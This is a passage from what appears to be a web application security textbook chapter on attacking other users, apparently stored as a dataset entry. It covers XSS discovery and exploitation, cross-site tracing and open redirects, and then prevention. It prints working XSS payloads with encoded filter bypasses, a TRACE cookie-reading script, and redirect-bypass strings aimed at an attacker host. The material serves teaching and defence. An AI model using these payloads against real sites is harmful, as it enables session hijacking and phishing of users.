6F ; ¼script¾alert(do\n63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/\n73 63 72 69 70 74 BE ; script¾\nUTF-16:\nFF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.\n3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.\n6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...\n63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.\n2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.\nThese encoded strings will bypass many common anti-XSS filters – the UTF-7\nand US-ASCII encodings enable you to avoid the < and > characters that are\noften sanitized, and the UTF-16 encoding does not contain any common black-\nlist expressions such as <script.\nToday’s browsers will not by default automatically recognize nonstandard\nencodings, and so the encoding type must be explicitly specified using the\ncharset attribute of the HTTP Content-Type header, or its corresponding\nHTML meta tag. If you can control either of these locations, then you may be\nable to use nonstandard encoding to bypass the application’s filters, and cause\nthe browser to interpret your payload in the way you require. In some appli-\ncations, a charset parameter is actually submitted in certain requests,\nenabling you to directly set the encoding type specified in the application’s\nresponse.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 415\nChapter 12 ■ Attacking Other Users 415\nTIP One qualification to the point about auto-detection of content encoding\nis that Internet Explorer tolerates null bytes appearing within HTML, and in\nmost cases simply ignores them. Provided that URL-encoded null bytes (%00)\nget returned by the application as actual null bytes, you can often use UTF-16\nencoding as an easy way of wrapping your XSS payloads in order to bypass\npattern-based filters, regardless of the Content-Typeheader being returned\nby the server. For example, in the original reflected XSS vulnerability, the\nfollowing attack using a UTF-16 encoded payload is effective against Internet\nExplorer:\nhttps://wahh-app.com/error.php?message=%FF%FE%3C%00%73%00%63%00%72%\n00%69%00%70%00%74%00%3E%00%61%00%6C%00%65%00%72%00%74%00%28%00%64%00%\n6F%00%63%00%75%00%6D%00%65%00%6E%00%74%00%2E%00%63%00%6F%00%6F%00%6B%\n00%69%00%65%00%29%00%3C%00%2F%00%73%00%63%00%72%00%69%00%70%00%74%00%\n3E%00\nBecause Internet Explorer ignores the nulls, it effectively auto-decodes your\npayload, causing the original attack to execute.\nFinding and Exploiting Stored XSS Vulnerabilities\nThe process of identifying stored XSS vulnerabilities overlaps substantially\nwith that described for reflected XSS, and includes submitting a unique string\nas every parameter to every page. However, there are some important differ-\nences which you must keep in mind to maximize the number of vulnerabilities\nidentified.\nHACK STEPS\n■ Having submitted a unique string to every possible location within the\napplication, it is necessary to review the entire content and functionality\nof the application once more to identify any instances where this string\nis displayed back to the browser. User-controllable data entered in one\nlocation (for example, a name field on a personal information page) may\nbe displayed in numerous different places throughout the application\n(for example, on the user’s home page, in a listing of registered users, in\nworkflow items such as tasks, on other users’ contact lists, in messages\nor questions posted by the user, in application logs, etc). Each appear-\nance of the string may be subject to different protective filters, and so\nneeds to be investigated separately.\nContinued\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 416\n416 Chapter 12 ■ Attacking Other Users\nHACK STEPS (CONTINUED)\n■ If possible, all areas of the application accessible by administrators\nshould be reviewed to identify the appearance of any data controllable\nby non-administrative users. For example, the application may allow\nadministrators to review log files in-browser. It is extremely common for\nthis type of functionality to contain XSS vulnerabilities that an attacker\ncan exploit by generating log entries containing malicious HTML.\n■ When submitting a test string to each location within the application, it is\nnot always sufficient simply to post it as each parameter to each page.\nMany application functions need to be followed through several stages\nbefore the submitted data is actually stored. For example, actions like\nregistering a new user, placing a shopping order, and making a funds\ntransfer often involve submitting several different requests in a defined\nsequence. To avoid missing any vulnerabilities, it is necessary to see each\ntest case through to completion.\n■ When probing for reflected XSS, you are interested in every aspect of a\nvictim’s request that you can control. This includes all parameters to the\nrequest, and also every HTTP header, because these can be controlled\nusing a crafted Flash object. In the case of stored XSS, you should also\ninvestigate any out-of-band channels through which the application\nreceives and processes input that you can control. Any such channels\nare suitable attack vectors for introducing stored XSS attacks. Review the\noutput of your application mapping exercises (see Chapter 4) to identify\nevery possible area of attack surface.\n■ If the application allows files to be uploaded and downloaded, always\nprobe this functionality for stored XSS attacks. If the application allows\nHTML or text files, and does not validate or sanitize their contents, then\nit is almost certainly vulnerable. If it allows JPEG files and does not vali-\ndate that they contain valid images, then it is probably vulnerable to\nattacks against Internet Explorer users. Test the application’s handling of\neach file type that it supports, and confirm how browsers handle\nresponses containing HTML instead of the normal content type.\n■ Think imaginatively about any other possible means by which data you\ncontrol may be stored by the application and displayed to other users.\nFor example, if the application search function shows a list of popular\nsearch items, you may be able to introduce a stored XSS payload by\nsearching for it numerous times, even though the primary search func-\ntionality itself handles your input safely.\nWhen you have identified every instance in which user-controllable data is\nstored by the application and later displayed back to the browser, you should fol-\nlow the same process described previously for investigating potential reflected\nXSS vulnerabilities—that is, determine what input needs to be submitted to\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 417\nChapter 12 ■ Attacking Other Users 417\nembed valid JavaScript within the surrounding HTML and then attempt to cir-\ncumvent any filters which interfere with the processing of your attack\npayload.\nTIP When probing for reflected XSS, it is trivial to identify which request\nparameters are potentially vulnerable, by testing one parameter at a time and\nreviewing each response for any appearance of your input. With stored XSS,\nhowever, this may be less straightforward. If you submit the same test string as\nevery parameter to every page, then you may find this string reappearing at\nmultiple locations within the application, and it may not be clear from the\ncontext precisely which parameter is responsible for the appearance. To avoid\nthis problem, you can submit a different test string as every parameter when\nprobing for stored XSS flaws—for example, by concatenating your unique\nstring with the name of the field it is being submitted to.\nFinding and Exploiting DOM-Based XSS Vulnerabilities\nDOM-based XSS vulnerabilities cannot be identified by submitting a unique\nstring as each parameter and monitoring responses for the appearance of that\nstring.\nOne basic method for identifying DOM-based XSS bugs is to manually walk\nthrough the application with your browser, and modify each URL parameter\nto contain a standard test string such as the following:\n“<script>alert(document.cookie)</script>\nBy actually displaying each returned page in your browser, you will cause\nall client-side scripts to execute, referencing your modified URL parameter\nwhere applicable. Any time a dialog box appears containing your cookies, you\nwill have found a vulnerability (which may be either DOM-based or standard\nreflected XSS). This process could even be automated by a tool which imple-\nmented its own JavaScript interpreter.\nHowever, this basic approach will not identify all DOM-based XSS bugs. As\nyou have already seen, the precise syntax required to inject valid JavaScript\ninto an HTML document depends upon the syntax that already appears before\nand after the point where the user-controllable string gets inserted. It may be\nnecessary to terminate a single- or double-quoted string or to close specific\ntags. Sometimes, new tags may be required, but sometimes not. The applica-\ntion may modify your input in various ways and yet may still be vulnerable.\nIf the standard test string does not happen to result in valid syntax when it\nis processed and inserted, then the embedded JavaScript will not execute and\nso no dialog will appear, even though the application may be vulnerable to a\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 418\n418 Chapter 12 ■ Attacking Other Users\nproperly crafted attack. Short of submitting every conceivable XSS attack\nstring into every parameter, the basic approach will inevitably miss a large\nnumber of vulnerabilities.\nA more effective approach to identifying DOM-based XSS bugs is to review\nall client-side JavaScript for any use of DOM properties that may lead to a\nvulnerability.\nHACK STEPS\nUsing the results of your application mapping exercises (see Chapter 4), review\nevery piece of client-side JavaScript for the following APIs, which may be used\nto access DOM data that is controllable via a crafted URL:\n■ document.location\n■ document.URL\n■ document.URLUnencoded\n■ document.referrer\n■ window.location\nBe sure to include scripts that appear in static HTML pages as well as\ndynamically generated pages—DOM-based XSS bugs may exist in any location\nwhere client-side scripts are used, regardless of the type of page or whether\nyou see parameters being submitted to the page.\nIn every instance where one of the precedingAPIs is being used, closely\nreview the code to identify what is being done with the user-controllable data,\nand whether crafted input could be used to cause execution of arbitrary\nJavaScript. In particular, review and test any instance where your data is being\npassed to any of the following APIs:\n■ document.write()\n■ document.writeln()\n■ document.body.innerHtml\n■ eval()\n■ window.execScript()\n■ window.setInterval()\n■ window.setTimeout()\nAs with reflected and stored XSS, you may find that the application imple-\nments filters that block requests containing certain malicious strings. Even\nthough the vulnerable operation occurs on the client, and the server does not\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 419\nChapter 12 ■ Attacking Other Users 419\nreturn the user-supplied data in its response, the URL is still submitted to the\nserver, and so the application may validate the data and fail to return the vul-\nnerable client-side script when a malicious payload is detected.\nIf this defense is encountered, you should attempt each of the potential fil-\nter bypasses that were described previously for reflected XSS vulnerabilities,\nto test the robustness of the server’s validation. In addition to these attacks,\nthere are several techniques unique to DOM-based XSS bugs that may enable\nyour attack payload to evade server-side validation.\nWhen client-side scripts extract a parameter’s value from the URL, they\nvery rarely parse the query string properly into name/value pairs. Instead,\nthey typically search the URL for the parameter name followed by the =sign,\nand then extract whatever comes next, up until the end of the URL. This\nbehavior can be exploited in two ways:\n■■ If the server’s validation logic is being applied on a per-parameter\nbasis, rather than on the entire URL, then the payload can be placed\ninto an invented parameter appended after the vulnerable parameter.\nFor example:\nhttps://wahh-app.com/error.php?message=Sorry%2c+an+error+occurred&\nfoo=<script>alert(document.cookie)</script>\nHere, the invented parameter is ignored by the server and so is not sub-\nject to any filtering. However, because the client-side script searches the\nquery string for message=and extracts everything following this, it will\ninclude your payload in the string which it processes.\n■■ If the server’s validation logic is being applied to the entire URL, and\nnot just to the message parameter, it may still be possible to evade the\nfilter by placing the payload to the right of the HTML fragment charac-\nter #. For example:\nhttps://wahh-app.com/error.php?message=Sorry%2c+an+error+\noccurred#<script>alert(document.cookie)</script>\nHere, the fragment string is still part of the URL, and so is stored in the\nDOM and will be processed by the vulnerable client-side script. How-\never, because browsers do not submit the fragment portion of the URL\nto the server, the attack string will not even be sent to the server, and so\ncannot be blocked by any kind of server-side filter. Because the client-\nside script extracts everything after message=, the payload is still copied\ninto the HTML page source.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 420\n420 Chapter 12 ■ Attacking Other Users\nCOMMON MYTH “We check every user request for embedded script tags,\nso no XSS attacks are possible.”\nAside from the question of whether any filter bypasses are possible, you have\nnow seen three reasons why this claim can be incorrect:\n■■ In some XSS flaws, the attacker-controllable data is being inserted\ndirectly into an existing JavaScript context, and so there is no need to\nuse either script tags or the javascript:protocol. In other cases, you\ncan inject an event hander containing JavaScript without using any\nscript tags.\n■■ If an application receives data via some out-of-band channel and\nrenders this within its web interface, then any stored XSS bugs can be\nexploited without submitting any malicious payload using HTTP.\n■■ Attacks against DOM-based XSS may not involve submitting any\nmalicious payload to the server. If the fragment technique is used, the\npayload remains on the client at all times.\nSome applications employ a more sophisticated client-side script that per-\nforms stricter parsing of the query string—for example, it may search the\nURL for the parameter name followed by the =sign, but then extract what fol-\nlows only until it reaches a relevant delimiter such as & or #. In this case, the\ntwo attacks described previouslycould be modified as follows:\nhttps://wahh-app.com/error.php?foomessage=<script>alert(document.cookie)\n</script>&message=Sorry%2c+an+error+occurred\nhttps://wahh-app.com/error.php#message=<script>alert(document.cookie)\n</script>\nIn both cases, the first match for message= is followed immediately by the\nattack string, without any intervening delimiter, and so the payload is\nprocessed and copied into the HTML page source.\nIn some cases, you may find that very complex processing is performed on\nDOM-based data, and it is difficult to trace all of the different paths taken by\nuser-controllable data, and all of the manipulation being performed, solely\nthrough static review of the JavaScript source code. In this situation, it can be\nvery beneficial to use a JavaScript debugger to monitor the script’s execution\ndynamically. The FireBug extension to the Firefox browser is a full-fledged\ndebugger for client-side code and content, which enables you to set break-\npoints and watches on interesting code and data, making the task of under-\nstanding a complex script considerably easier.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 421\nChapter 12 ■ Attacking Other Users 421\nCOMMON MYTH “We’re safe. Our web application scanner didn’t find any\nXSS bugs.”\nAs you will see in Chapter 19, some web applications scanners do a reasonable\njob of finding common flaws, including XSS. However, it should be evident at\nthis point that many XSS vulnerabilities are subtle to detect, and creating a\nworking exploit can require extensive probing and experimentation. At the\npresent time, no automated tools are capable of reliably identifying all of\nthese bugs.\nHttpOnly Cookies and Cross-Site Tracing\nAs you have seen, one of the various payloads for attacking XSS vulnerabili-\nties is to capture a victim’s session token by using injected JavaScript to access\nthe document.cookie property. HttpOnly cookies are a defense mechanism\nsupported by some browsers and employed by some applications in an\nattempt to prevent this attack payload from succeeding.\nWhen an application sets a cookie, it can be flagged as HttpOnly in the\nSet-Cookieheader:\nSet-Cookie: SessId=12d1a1f856ef224ab424c2454208ff; HttpOnly;\nWhen a cookie is flagged in this way, supporting browsers will prevent\nclient-side JavaScript from directly accessing the cookie. Although the browser\nwill still submit the cookie in the HTTP headers of requests, it will not be\nincluded in the string returned by document.cookie. Hence, using HttpOnly\ncookies can help to prevent an attacker from using XSS flaws to perform ses-\nsion hijacking attacks.\nNOTE HttpOnlycookies have no effect on any of the various other attack\npayloads that XSS flaws can be used to deliver. For example, the attack of\ninducing compromised users to perform an arbitrary action, as employed in the\nMySpace worm, is unaffected. Not all browsers support HttpOnlycookies,\nmeaning that they cannot always be relied upon to be effective. Further, as\ndescribed next, in some circumstances session hijacking is still possible even\nwhen HttpOnlycookies are used.\nCross-site tracing (or XST) is an attack technique that in some circumstances\ncan bypass the protection offered by HttpOnlycookies, and enable client-side\nJavaScript to gain access to the values of cookies flagged as HttpOnly.\nThe technique uses the HTTP TRACEmethod, which is designed for diagnos-\ntic purposes and is enabled on many web servers by default. When a server\nreceives a request using the TRACE method, the defined behavior is for it to\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 422\n422 Chapter 12 ■ Attacking Other Users\nrespond with a message whose body contains the exact text of the TRACE\nrequest that the server received. The reason that this is sometimes of value for\ndiagnostic purposes is that the request received by a server can be different\nfrom the request sent by a client, because of modifications made by interven-\ning proxies, and so on. The method can be used to determine what changes are\nbeing made to the request between client and server.\nBrowsers submit all cookies in HTTP requests, including requests that use\nthe TRACEmethod, and including cookies flagged as HttpOnly. For example:\nTRACE / HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, */*\nAccept-Language: en-gb,en-us;q=0.5\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET\nCLR 1.1.4322)\nHost: wahh-app.com\nCookie: SessId=12d1a1f856ef224ab424c2454208ff\nHTTP/1.1 200 OK\nDate: Thu, 01 Feb 2007 10:59:54 GMT\nServer: Apache\nContent-Type: message/http\nContent-Length: 426\nTRACE / HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, */*\nAccept-Language: en-gb,en-us;q=0.5\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET\nCLR 1.1.4322)\nHost: wahh-app.com\nCookie: SessId=12d1a1f856ef224ab424c2454208ff\nAs you can see, both the request and response contain the cookie that was\nflagged as HttpOnly, and this behavior is what opens the door to XST attacks.\nIf client-side JavaScript can be used to issue a TRACE request, and read the\nresponse to that request, then the script will be able to access cookies that are\nflagged as HttpOnly, even though these are not accessible via the\ndocument.cookieproperty. Of course, the attack will also depend upon some\nkind of XSS vulnerability, in order to inject the malicious JavaScript. What the\ntechnique demonstrates is how an attacker who has identified an exploitable\nXSS flaw can leverage the TRACEmethod to gain access to cookies that are sup-\nposed to be unavailable to it. Hence the name of the technique: cross-site\ntracing.\nIn older browsers, XST attacks could be delivered using the XMLHttpRequest\nobject that is employed in Ajax applications. For example, in older versions of\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 423\nChapter 12 ■ Attacking Other Users 423\nInternet Explorer, the following script will make a TRACE request and display\nthe response in a dialog, including any cookies submitted in the request:\n<script>\nvar request = new ActiveXObject(“Microsoft.XMLHTTP”);\nrequest.open(“TRACE”, “https://wahh-app.com”, false);\nrequest.send();\nalert(request.responseText);\n</script>\nCurrent browsers block TRACE requests using the XMLHttpRequest object,\nand XST attacks are no longer viable at the time of this writing.\nPreventing XSS Attacks\nDespite the various different manifestations of XSS, and the different possibil-\nities for exploitation, preventing the vulnerability itself is in fact conceptually\nstraightforward. What makes it problematic in practice is the difficulty of iden-\ntifying every instance in which user-controllable data is handled in a poten-\ntially dangerous way. Any given page of an application may process and\ndisplay dozens of items of user data. In addition to the core functionality, there\nare error messages and other locations in which vulnerabilities may arise. It is\nhardly surprising, therefore, that XSS flaws are so hugely prevalent, even in\nthe most security-critical applications.\nDifferent types of defense are applicable to reflected and stored XSS on the\none hand, and to DOM-based XSS on the other, because of their different root\ncauses.\nPreventing Reflected and Stored XSS\nThe root cause of both reflected and stored XSS is that user-controllable data is\ncopied into application responses without adequate validation and sanitiza-\ntion. Because the data is being inserted into the raw source code of an HTML\npage, malicious data can interfere with that page, modifying not only its con-\ntent but also its structure—breaking out of quoted strings, opening and clos-\ning tags, injecting scripts, and so on.\nTo eliminate reflected and stored XSS vulnerabilities, the first step is to\nidentify every instance within the application where user-controllable data is\nbeing copied into responses. This includes data that is copied from the imme-\ndiate request and also any stored data that originated from any user at any\nprior time, including via out-of-band channels. To ensure that every instance\nis identified, there is no real substitute for a close review of all application\nsource code.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 424\n424 Chapter 12 ■ Attacking Other Users\nHaving identified all of the operations which are potentially at risk of XSS\nand which need to be suitably defended, a threefold approach should be taken\nto prevent any actual vulnerabilities arising. This approach comprises the fol-\nlowing elements:\n■■ Validate input.\n■■ Validate output.\n■■ Eliminate dangerous insertion points.\nValidate Input\nAt the point where the application receives user-supplied data that may be\ncopied into one of its responses at any future point, the application should per-\nform context-dependent validation of this data, in as strict a manner as possi-\nble. Potential features to validate include the following:\n■■ That the data is not too long.\n■■ That the data only contains a certain permitted set of characters.\n■■ That the data matches a particular regular expression.\nDifferent validation rules should be applied as restrictively as possible to\nnames, email addresses, account numbers, and so on, according to the type of\ndata that the application is expecting to receive in each field.\nValidate Output\nAt the point where the application copies into its responses any item of data\nthat originated from some user or third party, this data should be HTML-\nencoded to sanitize potentially malicious characters. HTML-encoding\ninvolves replacing literal characters with their corresponding HTML entities.\nThis ensures that browsers will handle potentially malicious characters in a\nsafe way, treating them as part of the content of the HTML document and not\npart of its structure. The HTML-encodings of the primary problematic charac-\nters are as follows:\n“ &quot;\n‘ &apos;\n& &amp;\n< &lt;\n> &gt;\nIn addition to these common encodings, in fact any character can be HTML-\nencoded using its numeric ASCII character code, as follows:\n% &#37;\n* &#42;\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 425\nChapter 12 ■ Attacking Other Users 425\nASP applications can use the Server.HTMLEncode API to sanitize common\nmalicious characters within a user-controllable string, before this is copied into\nthe server’s response. This API converts the characters “ & <and >to their cor-\nresponding HTML entities, and also converts any ASCII character above 0x7f\nusing the numeric form of encoding.\nOn the Java platform, there is no equivalent built-in API available; however,\nit is simple to construct your own equivalent method using just the numeric\nform of encoding. For example:\npublic static String HTMLEncode(String s)\n{\nStringBuffer out = new StringBuffer();\nfor (int i = 0; i < s.length(); i++)\n{\nchar c = s.charAt(i);\nif(c > 0x7f || c==’“‘ || c==’&‘ || c==’<’ || c==’>’)\nout.append(“&#“ + (int) c + “;”);\nelse out.append(c);\n}\nreturn out.toString();\n}\nA common mistake made by developers is to HTML-encode only the char-\nacters that immediately appear to be of use to an attacker in the specific con-\ntext. For example, if an item is being inserted into a double-quoted string, the\napplication might encode only the “ character; if the item is being inserted\nunquoted into a tag, it might encode only the >character. This approach con-\nsiderably increases the risk of bypasses being found. As you have seen, an\nattacker can often exploit browsers’ tolerance of invalid HTML and JavaScript\nto change context or inject code in unexpected ways. Further, it is often possi-\nble to span an attack across multiple controllable fields, exploiting the differ-\nent filtering being employed in each one. A far more robust approach is to\nalways HTML-encode every character that may be of potential use to an\nattacker, regardless of the context where it is being inserted. To provide the\nhighest possible level of assurance, developers may elect to HTML-encode\nevery non-alphanumeric character, including whitespace. This approach nor-\nmally imposes no measurable overhead on the application, and presents a\nsevere obstacle to any kind of filter bypass attack.\nThe reason for combining input validation and output sanitization is that this\ninvolves two layers of defenses, either one of which will provide some protec-\ntion if the other one fails. As you have seen, many filters which perform input\nand output validation are subject to bypasses. By employing both techniques,\nthe application gains some additional assurance that an attacker will be defeated\neven if one of its two filters is found to be defective. Of the two defenses, the out-\nput validation is the most important and is absolutely mandatory. Performing\nstrict input validation should be viewed as a secondary failover.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 426\n426 Chapter 12 ■ Attacking Other Users\nOf course, when devising the input and output validation logic itself, great\ncare should be taken to avoid any vulnerabilities that lead to bypasses. In par-\nticular, filtering and encoding should be carried out after any relevant canoni-\ncalization, and the data should not be further canonicalized afterwards. The\napplication should also ensure that the presence of any null bytes does not\ninterfere with its validation.\nEliminate Dangerous Insertion Points\nThere are some locations within the application page where it is just too inher-\nently dangerous to insert user-supplied input, and developers should look for\nan alternative means of implementing the desired functionality.\nInserting user-controllable data directly into existing JavaScript should be\navoided wherever possible. When applications attempt to do this safely, it is\nfrequently possible to bypass their defensive filters. And once an attacker has\ntaken control of the context of the data he controls, he typically needs to per-\nform minimal work to inject arbitrary script commands and so perform mali-\ncious actions.\nA second location where user input should not be inserted is any other con-\ntext in which JavaScript commands may appear directly. For example:\n<img src=”userdata”>\n<img src=”foo.gif” onload=”userdata”>\n<input type=”text” name=”username” onfocus=”userdata”>\nIn these situations, an attacker can proceed directly to injecting JavaScript\ncommands within the quoted string. Further, the defense of HTML-encoding\nthe user data may not be effective, because some browsers will HTML-decode\nthe contents of the quoted string before this is processed. For example:\n<img src=”javascript&#58;alert(document.cookie)“>\n<img src=”foo.gif” onload=”alert(&apos;xss&apos;)“>\nA further pitfall to avoid is situations where an attacker can manipulate the\nencoding type of the application’s response, either by injecting into a relevant\ndirective or because the application uses a request parameter to specify the\npreferred encoding type. In this situation, input and output filters that are well\ndesigned in other respects may fail because the attacker’s input is encoded in\nan unusual form that the filters do not recognize as potentially malicious.\nWherever possible, the application should explicitly specify an encoding type\nin its response headers, disallow any means of modifying this, and ensure that\nits XSS filters are compatible with it. For example:\nContent-Type: text/html; charset=ISO-8859-1\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 427\nChapter 12 ■ Attacking Other Users 427\nPreventing DOM-Based XSS\nThe defenses described so far obviously do not apply directly to DOM-based\nXSS, because the vulnerability does not involve user-controlled data being\ncopied into server responses.\nWherever possible, applications should avoid using client-side scripts to\nprocess DOM data and insert it into the page. Because the data being\nprocessed is outside of the server’s direct control, and in some cases even out-\nside of its visibility, this behavior is inherently risky.\nIf it is considered unavoidable to use client-side scripts in this way, DOM-\nbased XSS flaws can be prevented through two types of defenses, correspond-\ning to the input and output validation described for reflected XSS.\nValidate Input\nIn many situations, applications can perform rigorous validation on the data\nbeing processed. Indeed, this is one area where client-side validation can be\nmore effective than server-side validation. In the vulnerable example\ndescribed earlier, the attack can be prevented by validating that the data about\nto be inserted into the document only contains alphanumeric characters and\nwhitespace. For example:\n<script>\nvar a = document.URL;\na = a.substring(a.indexOf(“message=”) + 8, a.length);\na = unescape(a);\nvar regex=/^([A-Za-z0-9+\\s])*$/;\nif (regex.test(a))\ndocument.write(a);\n</script>\nIn addition to this client-side control, rigorous server-side validation of URL\ndata can be employed as a defense-in-depth measure, in order to detect\nrequests that may contain malicious exploits for DOM-based XSS flaws. In the\nsame example just described, it would actually be possible for an application\nto prevent an attack by employing only server-side data validation, by verify-\ning that:\n■■ The query string contains a single parameter.\n■■ The parameter’s name is message(case-sensitive check).\n■■ The parameter’s value contains only alphanumeric content.\nWith these controls in place, it would still be necessary for the client-side\nscript to parse out the value of the messageparameter properly, ensuring that\nany fragment portion of the URL was not included."
  },
  {
    "input": "Redirection Attacks",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 428\n428 Chapter 12 ■ Attacking Other Users\nValidate Output\nAs with reflected XSS flaws, applications can perform HTML-encoding of\nuser-controllable DOM data before this is inserted into the document. This will\nenable all kinds of potentially dangerous characters and expressions to be dis-\nplayed within the page in a safe way. HTML encoding can be implemented in\nclient-side JavaScript with a function like the following:\nfunction sanitize(str)\n{\nvar d = document.createElement(‘div’);\nd.appendChild(document.createTextNode(str));\nreturn d.innerHTML;\n}\nPreventing XST\nThe XST technique depends upon finding some XSS flaw that allows the\nattacker to insert arbitrary JavaScript into a page viewed by another user.\nHence, eliminating all XSS vulnerabilities ought to remove any opportunities\nfor an attacker to use the technique. Nevertheless, it is recommended both that\nall cookies are flagged as HttpOnly and that the TRACE method is disabled on\nthe web server hosting the application.\nRedirection Attacks\nRedirection vulnerabilities arise when an application takes user-controllable\ninput and uses this to perform a redirection, instructing the user’s browser to\nvisit a different URL than the one requested. They are usually of less interest to\nan attacker than cross-site scripting vulnerabilities, which can be used to per-\nform a much wider range of malicious actions. Redirection bugs are primarily\nof use in phishing attacks where an attacker seeks to induce a victim to visit a\nspoofed web site and enter sensitive details. A redirection vulnerability can\nlend credibility to the attacker’s overtures to potential victims, because it\nenables him to construct a URL which points to the authentic web site he is tar-\ngeting, and which is therefore more convincing, but which causes anyone who\nvisits it to be redirected silently to a web site controlled by the attacker.\nIn fact, many applications actually perform redirects to third-party sites as\npart of their normal function—for example, to process customer payments.\nThis encourages users to perceive that redirection during a transaction is not\nnecessarily indicative of anything suspicious. An attacker can take advantage\nof this perception when exploiting redirection vulnerabilities.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 429\nChapter 12 ■ Attacking Other Users 429\nFinding and Exploiting Redirection Vulnerabilities\nThe first step in locating redirection vulnerabilities is to identify every instance\nwithin the application where a redirect occurs. There are several ways in which\nan application can cause the user’s browser to redirect to a different URL:\n■■ An HTTP redirect uses a message with a 3xx status code and a Location\nheader specifying the target of the redirect. For example:\nHTTP/1.1 302 Object moved\nLocation: https://wahh-app.com/showDetails.php?uid=19821\n■■ The HTTP Refreshheader can be used to reload a page with an arbi-\ntrary URL after a fixed interval, which may be zero to trigger an imme-\ndiate redirect. For example:\nHTTP/1.1 200 OK\nRefresh: 0; url=https://wahh-app.com/showDetails.php?uid=19821\n■■ The HTML <meta>tag can be used to replicate the behavior of any\nHTTP header and can, therefore, be used for redirection. For example:\nHTTP/1.1 200 OK\nContent-Length: 125\n<html>\n<head>\n<meta http-equiv=”refresh” content=\n”0;url=https://wahh-app.com/showDetails.php?uid=19821”>\n</head>\n</html>\n■■ Various APIs exist within JavaScript that can be used to redirect the\nbrowser to an arbitrary URL. For example:\nHTTP/1.1 200 OK\nContent-Length: 120\n<html>\n<head>\n<script>\ndocument.location=”https://wahh-app.com/showDetails.php?uid=19821”;\n</script>\n</head>\n</html>\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 430\n430 Chapter 12 ■ Attacking Other Users\nIn each of these cases, an absolute or relative URL may be specified.\nHACK STEPS\n■ Identify every instance within the application where a redirect occurs.\n■ An effective way to achieve this is to walk through the application using\nan intercepting proxy, and monitor the requests made for actual pages\n(as opposed to other resources like images, style sheets, script files, etc.).\n■ If a single navigation action results in more than one request in succes-\nsion, investigate what means of performing the redirect is being used.\nThe majority of redirects are not user-controllable. For example, in a typical\nlogin mechanism, submitting valid credentials to /login.jspmight return an\nHTTP redirect to /myhome.jsp. The target of the redirect is always the same, so\nit is not subject to any vulnerabilities involving redirection.\nHowever, in other cases, data supplied by the user is used in some way to\nset the target of the redirect. A common instance of this is where an application\nforces users whose sessions have expired to return to the login page and then\nredirects them back to the original URL following successful reauthentication.\nIf you encounter this type of behavior, then the application may be vulnerable\nto a redirection attack, and you should investigate further to determine\nwhether the behavior is exploitable.\nHACK STEPS\n■ If the user data being processed in a redirect contains an absolute URL,\nmodify the domain name within the URL, and test whether the applica-\ntion redirects you to the different domain.\n■ If the user data being processed contains a relative URL, modify this into\nan absolute URL for a different domain, and test whether the application\nredirects you to this domain.\n■ In both cases, if you see behavior like the following, then the application\nis certainly vulnerable to an arbitrary redirection attack:\nGET /redir.php?target=http://wahh-attacker.com/ HTTP/1.1\nHost: wahh-app.com\nHTTP/1.1 302 Object moved\nLocation: http://wahh-attacker.com/\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 431\nChapter 12 ■ Attacking Other Users 431\nCircumventing Obstacles to Attack\nIt is very common to encounter situations in which user-controllable data is\nbeing used to form the target of a redirect, but is being filtered or sanitized in\nsome way by the application, usually in an attempt to block redirection\nattacks. In this situation, the application may or may not be vulnerable, and\nyour next task should be to probe the defenses in place to determine whether\nthey can be circumvented to perform arbitrary redirection. The two general\ntypes of defense you may encounter are attempts to block absolute URLs, and\nthe addition of a specific absolute URL prefix.\nBlocking of Absolute URLs\nThe application may check whether the user-supplied string starts with\nhttp://, and if so, then block the request. In this situation, the following tricks\nmay succeed in causing a redirect to an external web site:\nHtTp://wahh-attacker.com\n%00http://wahh-attacker.com\nhttp://wahh-attacker.com [note the leading space]\n//wahh-attacker.com\n%68%74%74%70%3a%2f%2fwahh-attacker.com\n%2568%2574%2574%2570%253a%252f%252fwahh-attacker.com\nhttps://wahh-attacker.com\nAlternatively, the application may attempt to sanitize absolute URLs by\nremoving http://and any external domain specified. In this situation, any of\nthe preceding bypasses may be successful, and the following attacks should\nalso be tested:\nhttp://http://wahh-attacker.com\nhttp://wahh-attacker.com/http://wahh-attacker.com\nhthttp://tp://wahh-attacker.com\nSometimes, the application may verify that the user-supplied string either\nstarts with or contains an absolute URL to its own domain name. In this situa-\ntion, the following bypasses may be effective:\nhttp://wahh-app.com.wahh-attacker.com\nhttp://wahh-attacker.com/?http://wahh-app.com\nhttp://wahh-attacker.com/%23http://wahh-app.com\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 432\n432 Chapter 12 ■ Attacking Other Users\nAddition of an Absolute Prefix\nThe application may form the target of the redirect by appending the user-\ncontrollable string to an absolute URL prefix. For example:\nGET /redir.php?target=/private/admin.php HTTP/1.1\nHost: 